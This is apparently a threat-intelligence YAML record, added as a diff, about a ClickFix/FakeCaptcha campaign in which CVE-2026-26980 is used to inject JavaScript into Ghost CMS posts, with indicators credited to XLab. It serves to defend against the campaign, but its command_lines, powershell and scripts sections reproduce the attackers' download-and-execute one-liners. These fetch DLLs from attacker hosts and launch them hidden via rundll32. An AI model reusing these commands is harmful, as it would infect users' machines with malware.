@@ -1,0 +1,172 @@
+title: CVE-2026-26980 Ghost CMS ClickFix Campaign
+description: Attackers exploit CVE-2026-26980 in Ghost CMS to inject malicious JavaScript
+  via the Admin API, delivering a multi-stage ClickFix/FakeCaptcha payload that drops
+  and executes Rust-based DLL malware via rundll32. Two distinct threat actors are
+  identified using different infrastructure and injection markers.
+attribution: ''
+malware_families:
+- Ghost CMS JavaScript Loader
+- installer.dll
+- NotepadPlusPlus.dll
+- publl.dll
+- UtilifySetup.exe
+- SuperAppizeSetup.msi
+cves:
+- CVE-2026-26980
+ttps:
+  processes:
+  - powershell.exe
+  - rundll32.exe
+  - cmd.exe
+  - sup.exe
+  - UtilifySetup.exe
+  command_lines:
+  - cmd /c "move %USERPROFILE%\Downloads\update.zip %TEMP%\u.zip && tar -xf %TEMP%\u.zip
+    -C %TEMP% && start /min "" %TEMP%\update.bat" & REM* I am not a robot reCAPTCHA
+    Verification ID:2771
+  - powershell -W 1 -C "$f=$env:Temp+'\installer.dll'; iwr 'https://link.storjshare[.]io/raw/jwqiycdezuj5gpqsyqn3damxbhgq/000/supman/installer.dll'
+    -OutFile $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden"
+  - powershell -W 1 -C "$f=$env:Temp+'\installer.dll'; iwr 'https://link.storjshare[.]io/raw/jwl6ukpgv3mronv4ik2atzxsfxzq/sup/installer.dll'
+    -OutFile $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden"
+  - powershell -W 1 -C "$f=$env:Temp+'\publl.dll'; iwr 'https://t[.]ly/docreport09052026.pdf'
+    -OutFile $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden"
+  - powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c %~f0
+    am_admin' -WindowStyle Minimized"
+  - powershell -WindowStyle Hidden -Command ^"$dll = '%APPDATA%\Microsoft\Windows\NotepadPlusPlus.dll';
+    ^Invoke-WebRequest 'https://taketwolabs[.]com/wp-content/NotepadPlusPlus.dll'
+    -OutFile $dll -UseBasicParsing; ^Start-Process rundll32 -ArgumentList $dll, 'Begin'
+    -WindowStyle Hidden"
+  powershell:
+  - $f=$env:Temp+'\installer.dll'; iwr 'https://link.storjshare[.]io/raw/jwqiycdezuj5gpqsyqn3damxbhgq/000/supman/installer.dll'
+    -OutFile $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden
+  - $f=$env:Temp+'\installer.dll'; iwr 'https://link.storjshare[.]io/raw/jwl6ukpgv3mronv4ik2atzxsfxzq/sup/installer.dll'
+    -OutFile $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden
+  - $f=$env:Temp+'\publl.dll'; iwr 'https://t[.]ly/docreport09052026.pdf' -OutFile
+    $f; Start-Process rundll32 -ArgumentList $f,'Begin' -Window Hidden
+  - $dll = '%APPDATA%\Microsoft\Windows\NotepadPlusPlus.dll'; Invoke-WebRequest 'https://taketwolabs[.]com/wp-content/NotepadPlusPlus.dll'
+    -OutFile $dll -UseBasicParsing; Start-Process rundll32 -ArgumentList $dll, 'Begin'
+    -WindowStyle Hidden
+  scripts:
+  - '@echo off
+
+    powershell -W 1 -C "$f=$env:Temp+''\installer.dll''; iwr ''https://link.storjshare[.]io/raw/jwqiycdezuj5gpqsyqn3damxbhgq/000/supman/installer.dll''
+    -OutFile $f; Start-Process rundll32 -ArgumentList $f,''Begin'' -Window Hidden"
+
+    start "" "https://youtube.com"'
+  - '@echo off
+
+    powershell -W 1 -C "$f=$env:Temp+''\installer.dll''; iwr ''https://link.storjshare[.]io/raw/jwl6ukpgv3mronv4ik2atzxsfxzq/sup/installer.dll''
+    -OutFile $f; Start-Process rundll32 -ArgumentList $f,''Begin'' -Window Hidden"
+
+    start "" "https://wl[.]gl/supp.jpg"
+
+    exit'
+  - '@echo off
+
+    powershell -W 1 -C "$f=$env:Temp+''\publl.dll''; iwr ''https://t[.]ly/docreport09052026.pdf''
+    -OutFile $f; Start-Process rundll32 -ArgumentList $f,''Begin'' -Window Hidden"
+
+    start "" "https://bc[.]ax/Supp.html"
+
+    exit'
+  - '@echo off
+
+    setlocal
+
+    if not "%1"=="am_admin" (powershell -WindowStyle Hidden -Command "Start-Process
+    cmd -ArgumentList ''/c %~f0 am_admin'' -WindowStyle Minimized" & exit /b)
+
+    mode con: cols=1 lines=1
+
+    powershell -WindowStyle Hidden -Command ^"$dll = ''%APPDATA%\Microsoft\Windows\NotepadPlusPlus.dll'';
+    ^Invoke-WebRequest ''https://taketwolabs[.]com/wp-content/NotepadPlusPlus.dll''
+    -OutFile $dll -UseBasicParsing; ^Start-Process rundll32 -ArgumentList $dll, ''Begin''
+    -WindowStyle Hidden"
+
+    exit'
+  - atob("aHR0cHM6Ly9jbG80c2hhcmEueHl6LzExejc3dTMucGhw")
+  - d += a.search.substring(1)
+  - c.id = btoa(a.origin)
+  - b.appendChild(c)
+  registry_keys: []
+  image_loads:
+  - installer.dll
+  - NotepadPlusPlus.dll
+  - publl.dll
+  network_connections:
+  - rundll32.exe -> link.storjshare[.]io:443
+  - rundll32.exe -> taketwolabs[.]com:443
+  - powershell.exe -> clo4shara[.]xyz:443
+  - powershell.exe -> cloud-verification[.]com:443
+  - powershell.exe -> com-apps[.]cc:443
+  - powershell.exe -> jalwat[.]com:443
+  - UtilifySetup.exe -> web-telegram[.]ug:443
+  - UtilifySetup.exe -> amazonbusketss-535659318049-us-west-1-an.s3.us-west-1.amazonaws[.]com:443
+  file_activity:
+  - '%TEMP%\u.zip'
+  - '%TEMP%\update.bat'
+  - '%APPDATA%\Microsoft\Windows\NotepadPlusPlus.dll'
+  - '%appdata%\local\SuperMaxion'
+  persistence:
+  - Electron app UtilifySetup.exe uses setLoginItemSettings API for login item persistence
+  - Ghost CMS Admin API key injection via PUT /ghost/api/admin/posts/:id/ to maintain
+    malicious script in CMS posts
+  process_relations:
+  - cmd.exe -> powershell.exe
+  - powershell.exe -> rundll32.exe
+  - cmd.exe -> rundll32.exe
+iocs:
+  hashes:
+  - 5659292833ec421da11ebde005d9c9a8
+  - d30cc10d54ebc967c8538ff74f442eee
+  - 18a7251ddde77ed24bc54700d84d9be1
+  - 9434fe686801742ef7d6da248fb0b900dc32208a
+  - ec5dfee13abf94e08d0f94e90b527db0
+  - f280e12f51f996dae7fffc64a56ee527
+  - fceca579efcef09eb507c6ca977ea281
+  ip_addresses:
+  - 144.31.236[.]66
+  domains:
+  - clo4shara[.]xyz
+  - cloud-verification[.]com
+  - jalwat[.]com
+  - com-apps[.]cc
+  - web-telegram[.]ug
+  - taketwolabs[.]com
+  - platecrumbs[.]com
+  - staticcloudflare[.]pro
+  - script-dev[.]buzz
+  - updatesecurity[.]pro
+  - updatefilescf[.]top
+  - static-file[.]digital
+  - download-file[.]today
+  - updatefile-cf[.]dgital
+  - script-dev[.]digital
+  - updatefile-cf[.]top
+  - script-dev[.]xyz
+  - cdnupdatenews[.]top
+  - amazonbusketss-535659318049-us-west-1-an.s3.us-west-1.amazonaws[.]com
+  - link.storjshare[.]io
+  urls:
+  - hxxps://clo4shara[.]xyz/11z77u3.php
+  - hxxps://com-apps[.]cc/11z77u3.php
+  - hxxps://platecrumbs[.]com/11z77u3.php
+  - hxxps://cloud-verification[.]com/update.zip
+  - hxxps://com-apps[.]cc/update.zip
+  - hxxps://com-apps[.]cc/NotepadPlusPlus.zip
+  - hxxps://jalwat[.]com/static/uploads/campaigns/6/update.zip
+  - hxxps://taketwolabs[.]com/wp-content/NotepadPlusPlus.dll
+  - hxxps://staticcloudflare[.]pro/api/css.js
+  - hxxps://script-dev[.]digital/api/css.js
+  - hxxps://cdnupdatenews[.]top/dl?fid=38
+  - hxxps://link.storjshare[.]io/raw/jwqiycdezuj5gpqsyqn3damxbhgq/000/supman/installer.dll
+  - hxxps://link.storjshare[.]io/raw/jwl6ukpgv3mronv4ik2atzxsfxzq/sup/installer.dll
+  - hxxps://wl[.]gl/sup.exe
+  - hxxps://wl[.]gl/supp.jpg
+  - hxxps://t[.]ly/docreport09052026.pdf
+  - hxxps://bc[.]ax/Supp.html
+authors:
+- XLab
+reference: https://blog.xlab.qianxin.com/ghost-cms-page-poisoning-cve-2026-26980/
+date_of_publication: May 21, 2026
+file_creation_date: May 22, 2026
